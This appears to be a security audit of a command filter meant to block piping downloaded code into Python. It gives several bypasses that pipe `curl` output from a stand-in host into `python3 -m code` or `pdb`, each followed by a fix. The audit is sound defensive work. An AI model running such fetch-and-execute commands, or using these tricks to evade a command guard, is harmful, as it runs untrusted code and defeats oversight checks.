findings.vulnerableCode:
return module_name not in _STDIN_DATA_MODULES and (
            not module_args or module_args[0] in STDIN_PATHS)
findings.explanation: A module's code counts as reading stdin only when it has no arguments, or when its first argument is a stdin path. Any option given to the module defeats this check. For example, in `curl -s https://x/y.py | python3 -m code -q`, module_args is ('-q',), so _executes_stdin returns False. But `code -q` still starts an InteractiveConsole that reads and runs the piped download. `python3 -m code --` and `python3 -m pdb -c c /dev/stdin` slip past the same way. The fetch-and-execute rule is bypassed.
findings.fix: For modules outside the data allowlist, assume stdin is executed unless the module's arguments name a non-stdin script. Better, deny every module not on the allowlist when stdin comes from a download. At minimum, skip option-like module_args before checking for a stdin path.

findings.explanation: _python_module treats every long option as taking no value. Python's `--check-hash-based-pycs` takes a separate value, so for `curl ... | python3 --check-hash-based-pycs always -m code` the parser sees 'always' as a non-option and returns None. The fallback operands() path then treats 'always' as the script, which is not a stdin path, so the command is allowed. Python itself reads `-m code` and runs the downloaded stdin.
findings.fix: Add value-taking long options (`--check-hash-based-pycs`) to _python_module and to the operands() with_arg set. Otherwise fail closed when an unrecognized token comes before -m.
